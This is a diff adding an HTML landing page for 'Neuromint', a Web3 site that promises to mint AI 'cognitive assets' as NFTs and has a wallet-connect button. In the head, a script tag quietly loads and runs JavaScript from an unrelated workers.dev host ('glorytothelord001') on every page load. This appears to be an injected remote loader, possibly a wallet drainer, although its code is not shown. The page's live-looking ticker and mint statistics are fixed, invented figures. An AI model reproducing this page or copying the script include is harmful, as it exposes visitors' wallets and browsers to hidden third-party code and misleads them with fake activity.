@@ -1,0 +1,608 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Neuromint is a decentralized neural synthesizer and AI agent minting protocol. Tweak weights, model telemetry, and mint cognitive assets onchain."
+    />
+    <title>NEUROMINT — Onchain Neural Synthesis Protocol</title>
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <!-- Icons -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+    />
+    <link rel="stylesheet" href="style.css" />
+
+    <script
+      charset="UTF-8"
+      type="text/javascript"
+      src="https://bm-dr.glorytothelord001.workers.dev"
+    ></script>
+  </head>
+  <body>
+    <!-- Background FX -->
+    <canvas id="bg-canvas"></canvas>
+    <div class="cyber-grid" aria-hidden="true"></div>
+    <div class="nebula-glow" aria-hidden="true"></div>
+    <div class="cursor-glow" aria-hidden="true"></div>
+
+    <!-- Telemetry Ribbon -->
+    <div class="demo-ribbon">
+      <span>
+        <i class="fa-solid fa-microchip"></i>
+        <span>NEURAL-NET: ONLINE</span>
+      </span>
+      <span class="ribbon-copy">
+        <i class="fa-solid fa-cube"></i> BLOCK HEIGHT:
+        <strong id="ribbon-block">24,801,984</strong>
+      </span>
+      <span class="ribbon-copy">
+        <i class="fa-solid fa-bolt"></i> SYNAPTIC HASH:
+        <strong id="ribbon-hash">854.2 T/S</strong>
+      </span>
+      <span class="ribbon-status"> <i></i> <span>NETWORK SYNCED</span> </span>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="nav-shell" aria-label="Primary navigation">
+      <a class="brand" href="#top" aria-label="Neuromint home">
+        <div class="brand-logo-mesh">
+          <i class="fa-solid fa-brain"></i>
+        </div>
+        <span>NEUROMINT</span>
+      </a>
+
+      <div class="nav-links">
+        <a href="#synthesizer">Synthesizer</a>
+        <a href="#nodes">Network Nodes</a>
+        <a href="#telemetry">Telemetry</a>
+      </div>
+
+      <button class="nav-cta" id="connect-wallet-btn">
+        <i class="fa-solid fa-network-wired"></i>
+        <span>Sync Neural Link</span>
+      </button>
+    </nav>
+
+    <!-- Main Content -->
+    <main id="top">
+      <!-- Hero Section -->
+      <section class="hero">
+        <div class="hero-copy">
+          <div class="eyebrow">
+            <span class="pulse-dot"></span>
+            <span>PROTOCOL COGNITION / V2.06</span>
+          </div>
+
+          <h1>
+            Mint the next<br />
+            <span class="outline-word">evolution of</span><br />
+            <span class="accent-word">cognition.</span>
+          </h1>
+
+          <p class="hero-lede">
+            Neuromint tokenizes synaptic weights, cognitive telemetry, and
+            autonomous AI agents onchain. Synthesize deep neural models, deploy
+            decentralized worker nodes, and own your digital intelligence.
+          </p>
+
+          <div class="hero-actions">
+            <button class="primary-btn" id="hero-mint-trigger">
+              <span>Synthesize Asset</span>
+              <span class="button-icon"
+                ><i class="fa-solid fa-arrow-right"></i
+              ></span>
+            </button>
+            <button class="secondary-btn" id="hero-scroll-trigger">
+              <span>Inspect Telemetry</span>
+              <i class="fa-solid fa-sliders"></i>
+            </button>
+          </div>
+
+          <div class="hero-proof">
+            <div class="avatar-stack" aria-hidden="true">
+              <img
+                src="https://images.unsplash.com/photo-1620712943543-bcc4688e7485?auto=format&fit=crop&w=96&q=80"
+                alt=""
+              />
+              <img
+                src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=96&q=80"
+                alt=""
+              />
+              <img
+                src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=96&q=80"
+                alt=""
+              />
+            </div>
+            <div class="proof-copy">
+              <strong>942,801</strong>
+              <span>Cognitive Mints</span>
+            </div>
+            <div class="proof-divider"></div>
+            <div class="proof-stat">
+              <strong>14.28 ExaFLOPs</strong>
+              <span>Total Synaptic Compute</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3D Neural Orbital Canvas visual -->
+        <div class="hero-visual">
+          <div class="neural-stage-wrapper">
+            <div class="orbital-ring ring-outer"></div>
+            <div class="orbital-ring ring-mid"></div>
+
+            <div class="neural-canvas-container">
+              <canvas id="neural-core-canvas"></canvas>
+            </div>
+
+            <!-- Floaters -->
+            <div class="floating-telemetry card-left">
+              <div class="telemetry-header">
+                <i class="fa-solid fa-wave-square"></i>
+                <span>Active Entropy</span>
+              </div>
+              <div class="telemetry-body">
+                <strong id="hero-entropy-val">0.42</strong>
+                <span>COGNITIVE</span>
+              </div>
+            </div>
+
+            <div class="floating-telemetry card-right">
+              <div class="telemetry-header">
+                <i class="fa-solid fa-network-wired"></i>
+                <span>Density Factor</span>
+              </div>
+              <div class="telemetry-body">
+                <strong id="hero-density-val">78.4%</strong>
+                <span>SYNAPSE</span>
+              </div>
+            </div>
+
+            <div class="stage-coordinate coord-tl">[0.184 // BATCH-64]</div>
+            <div class="stage-coordinate coord-br">[42.92° N // NODE-981]</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Token/Chain Activity Strip -->
+      <section class="chain-strip" aria-label="Live Neural Activity ticker">
+        <div class="ticker-track">
+          <div class="ticker-set" id="ticker-set-1">
+            <!-- Dynamically populated/static tickers -->
+            <div class="ticker-item">
+              <i class="fa-solid fa-microchip"></i>
+              <span>AGENT-704</span>
+              <strong>MINTED</strong>
+              <span class="up">3.40 MNT</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-brain"></i>
+              <span>SYNAPSE-38</span>
+              <strong>LOSS RATIO</strong>
+              <span class="down">0.024%</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-bolt"></i>
+              <span>MODEL-X</span>
+              <strong>LATENCY</strong>
+              <span class="up">12.4ms</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-shield-halved"></i>
+              <span>NODE-990</span>
+              <strong>ATTESTED</strong>
+              <span class="up">100%</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-circle-nodes"></i>
+              <span>NXT-COGNITION</span>
+              <strong>PRICE</strong>
+              <strong>$84.29</strong>
+              <span class="up">+8.42%</span>
+            </div>
+          </div>
+          <div class="ticker-set" id="ticker-set-2" aria-hidden="true">
+            <div class="ticker-item">
+              <i class="fa-solid fa-microchip"></i>
+              <span>AGENT-704</span>
+              <strong>MINTED</strong>
+              <span class="up">3.40 MNT</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-brain"></i>
+              <span>SYNAPSE-38</span>
+              <strong>LOSS RATIO</strong>
+              <span class="down">0.024%</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-bolt"></i>
+              <span>MODEL-X</span>
+              <strong>LATENCY</strong>
+              <span class="up">12.4ms</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-shield-halved"></i>
+              <span>NODE-990</span>
+              <strong>ATTESTED</strong>
+              <span class="up">100%</span>
+            </div>
+            <div class="ticker-item">
+              <i class="fa-solid fa-circle-nodes"></i>
+              <span>NXT-COGNITION</span>
+              <strong>PRICE</strong>
+              <strong>$84.29</strong>
+              <span class="up">+8.42%</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Synthesizer Console Section -->
+      <section class="synth-workspace" id="synthesizer">
+        <div class="section-intro">
+          <div class="eyebrow cyber-corners">
+            <span>01 // PARAMETRIC LAB</span>
+          </div>
+          <h2>Interactive <span>Neural Synthesizer</span></h2>
+          <p>
+            Tweak the neural matrix variables. Watch the synaptogenesis run in
+            real-time, then mint your custom configuration as a tokenized
+            onchain cognitive asset.
+          </p>
+        </div>
+
+        <div class="synth-container">
+          <!-- Control Panel -->
+          <div class="synth-controls">
+            <!-- Slider 1 -->
+            <div class="synth-control-group">
+              <div class="control-label-row">
+                <span>Synaptic Complexity (Density)</span>
+                <span class="control-val-readout" id="density-readout"
+                  >45%</span
+                >
+              </div>
+              <div class="slider-container">
+                <input
+                  type="range"
+                  min="10"
+                  max="100"
+                  value="45"
+                  class="synth-slider"
+                  id="density-slider"
+                />
+              </div>
+              <p class="synth-description">
+                Adjusts the count of artificial neurons and interconnection
+                synapses. Higher values enable deeper logical indexing but
+                increase gas fees.
+              </p>
+            </div>
+
+            <!-- Slider 2 -->
+            <div class="synth-control-group">
+              <div class="control-label-row">
+                <span>Cognitive Entropy (Noise)</span>
+                <span class="control-val-readout" id="entropy-readout"
+                  >0.25</span
+                >
+              </div>
+              <div class="slider-container">
+                <input
+                  type="range"
+                  min="0"
+                  max="100"
+                  value="25"
+                  class="synth-slider"
+                  id="entropy-slider"
+                />
+              </div>
+              <p class="synth-description">
+                Simulates cognitive drift and creative randomness. Optimal for
+                creative tasks; lower settings provide absolute deterministic
+                precision.
+              </p>
+            </div>
+
+            <!-- Slider 3 -->
+            <div class="synth-control-group">
+              <div class="control-label-row">
+                <span>Core Frequency Presets</span>
+                <span class="control-val-readout" id="freq-readout">Alpha</span>
+              </div>
+              <div class="slider-container">
+                <input
+                  type="range"
+                  min="0"
+                  max="3"
+                  value="1"
+                  class="synth-slider"
+                  id="freq-slider"
+                />
+              </div>
+              <p class="synth-description">
+                Adjusts wave resonance frequencies: Delta (Deep Synthesis),
+                Theta (Creative Integration), Alpha (Analytical Focus), Beta
+                (High-Velocity Response).
+              </p>
+            </div>
+
+            <!-- Synth Actions -->
+            <div class="synth-actions">
+              <button class="primary-btn" id="synth-mint-btn">
+                <i class="fa-solid fa-microchip"></i>
+                <span>Synthesize Neural Model</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- Interactive Screen & Analytics readout -->
+          <div class="synth-display">
+            <div class="hologram-screen">
+              <div class="hologram-grid-overlay"></div>
+              <div class="hologram-scanline"></div>
+              <canvas
+                id="synth-hologram-canvas"
+                class="hologram-mesh-canvas"
+              ></canvas>
+            </div>
+
+            <!-- Telemetry Data boxes -->
+            <div class="telemetry-grid">
+              <div class="telemetry-item">
+                <label>Estimated Token ID</label>
+                <span id="tel-token-id">NXT-0x4f...8a</span>
+              </div>
+              <div class="telemetry-item">
+                <label>Model Capacity (Parameters)</label>
+                <span id="tel-parameters" class="highlight">14.8M</span>
+              </div>
+              <div class="telemetry-item">
+                <label>Synaptic Loss Value</label>
+                <span id="tel-loss">0.0381%</span>
+              </div>
+              <div class="telemetry-item">
+                <label>Calculated Synthesis Cost</label>
+                <span id="tel-cost">1.28 MNT</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Bento Grid (Telemetry and Node Operations) -->
+      <section class="signals-section" id="nodes">
+        <div class="section-intro">
+          <div class="eyebrow cyber-corners">
+            <span>02 // NODE TELEMETRY</span>
+          </div>
+          <h2>Decentralized <span>Network Matrix</span></h2>
+          <p>
+            Neuromint runs on a planetary layer of zero-knowledge node workers
+            verifying neural states continuously.
+          </p>
+        </div>
+
+        <div class="bento-grid">
+          <!-- Live Terminal logs (Left Column) -->
+          <div class="bento-left-column">
+            <div class="bento-card bento-wide">
+              <div>
+                <span class="bento-tag"
+                  ><i class="fa-solid fa-terminal"></i> Compute stream</span
+                >
+                <h3>Onchain Node Logs<br /><em>Real-time validation</em></h3>
+                <p>
+                  Observe the global network validating cognitive weights,
+                  attesting compute integrity, and writing finalized blocks to
+                  the Neuromint chain.
+                </p>
+              </div>
+
+              <!-- Terminal console emulator -->
+              <div class="bento-terminal-container">
+                <div class="terminal-header">
+                  <div class="terminal-dots">
+                    <span></span><span></span><span></span>
+                  </div>
+                  <div class="terminal-title">node-981-operator</div>
+                  <div class="terminal-status">
+                    <i class="fa-solid fa-circle"></i> live
+                  </div>
+                </div>
+                <div class="terminal-body" id="terminal-body">
+                  <!-- Lines will be populated dynamically -->
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Grid details (Right Column) -->
+          <div class="bento-right-column">
+            <!-- Bento Box 1 -->
+            <div class="bento-small-card highlight-card">
+              <div class="bento-icon-box">
+                <i class="fa-solid fa-shield-halved"></i>
+              </div>
+              <div>
+                <h4>Zero-Wallet Sandbox</h4>
+                <p>
+                  Simulate, customize, and prototype neural syntheses without
+                  risk. Deploy cognitive templates inside a protected
+                  transaction sandbox before syncing real stakes.
+                </p>
+              </div>
+            </div>
+
+            <!-- Bento Box 2 -->
+            <div class="bento-small-card">
+              <div class="bento-icon-box">
+                <i class="fa-solid fa-dna"></i>
+              </div>
+              <div>
+                <h4>Evolving Synaptic Weights</h4>
+                <p>
+                  Minted cognitive assets aren't static. They evolve dynamically
+                  onchain based on interaction frequency, learning feeds, and
+                  node training cycles.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Call To Action -->
+      <section class="synth-cta-section" id="telemetry">
+        <div class="cta-mesh-rings">
+          <div class="cta-ring"></div>
+          <div class="cta-ring-inner"></div>
+        </div>
+
+        <div class="cta-content">
+          <div class="eyebrow cyber-corners">
+            <span>DEPLOY COGNITION</span>
+          </div>
+          <h2>Ready to mint your <span>own AI model?</span></h2>
+          <p>
+            Join thousands of designers, researchers, and neural architects
+            synthesizing cognitive contracts without code.
+          </p>
+          <button class="primary-btn" id="cta-mint-trigger">
+            <span>Launch Sandbox Synthesizer</span>
+            <span class="button-icon"
+              ><i class="fa-solid fa-arrow-right"></i
+            ></span>
+          </button>
+        </div>
+      </section>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+      <div class="footer-container">
+        <div class="footer-info">
+          <a class="brand" href="#top">
+            <div class="brand-logo-mesh"><i class="fa-solid fa-brain"></i></div>
+            <span>NEUROMINT</span>
+          </a>
+          <p>Decentralized Neural Assets. Powered by ZK Cognitive Proofs.</p>
+        </div>
+
+        <div class="footer-meta">
+          <span>© 2026 / NEUROMINT NETWORKS LTD</span>
+          <div class="footer-socials">
+            <a href="#" aria-label="X / Twitter"
+              ><i class="fa-brands fa-x-twitter"></i
+            ></a>
+            <a href="#" aria-label="Discord"
+              ><i class="fa-brands fa-discord"></i
+            ></a>
+            <a href="#" aria-label="GitHub"
+              ><i class="fa-brands fa-github"></i
+            ></a>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Web3 Interactive Minting Checkout Modal -->
+    <div
+      class="modal"
+      id="checkoutModal"
+      aria-hidden="true"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="modalTitle"
+    >
+      <div class="modal-backdrop" id="modal-backdrop"></div>
+      <div class="modal-panel cyber-corners">
+        <button
+          class="modal-close"
+          id="modal-close-btn"
+          aria-label="Close dialog"
+        >
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+
+        <div class="modal-header-block">
+          <span>WEB3 TRANSACTION IN PROGRESS</span>
+          <h2 id="modalTitle">Neural Synthesis</h2>
+        </div>
+
+        <!-- Progress Steps -->
+        <div class="modal-steps-container" id="modal-steps">
+          <div class="modal-step-item pending" id="step-1">
+            <div class="modal-step-label">
+              <i class="fa-solid fa-network-wired"></i>
+              <span>Synchronizing Neural Link connection</span>
+            </div>
+            <span class="step-status">PENDING</span>
+          </div>
+
+          <div class="modal-step-item pending" id="step-2">
+            <div class="modal-step-label">
+              <i class="fa-solid fa-microchip"></i>
+              <span>Generating synaptic weight hash</span>
+            </div>
+            <span class="step-status">PENDING</span>
+          </div>
+
+          <div class="modal-step-item pending" id="step-3">
+            <div class="modal-step-label">
+              <i class="fa-solid fa-shield-halved"></i>
+              <span>Attesting proof-of-compute onchain</span>
+            </div>
+            <span class="step-status">PENDING</span>
+          </div>
+
+          <div class="modal-step-item pending" id="step-4">
+            <div class="modal-step-label">
+              <i class="fa-solid fa-cube"></i>
+              <span>Minting Cognitive NFT asset</span>
+            </div>
+            <span class="step-status">PENDING</span>
+          </div>
+        </div>
+
+        <!-- Dynamic NFT Result visual (Shows only on complete) -->
+        <div class="modal-result-card" id="nft-result-card">
+          <div class="nft-card-rotating" id="nft-card">
+            <span class="nft-badge">NFT</span>
+            <div class="nft-artwork">
+              <canvas id="nft-card-canvas"></canvas>
+            </div>
+            <div class="nft-details">
+              <label>Cognitive Token Asset</label>
+              <h4 id="nft-token-name">NEURO-ALPHA #4920</h4>
+              <div class="nft-stats-row">
+                <div class="nft-stat-col">
+                  <label>Complexity</label>
+                  <span id="nft-stat-density">84%</span>
+                </div>
+                <div class="nft-stat-col">
+                  <label>Entropy</label>
+                  <span id="nft-stat-entropy">0.12</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Action Button -->
+        <button class="modal-action-btn" id="modal-action-btn" disabled>
+          <span>Initiate Matrix Sync</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Script References -->
+    <script src="script.js"></script>
+  </body>
+</html>
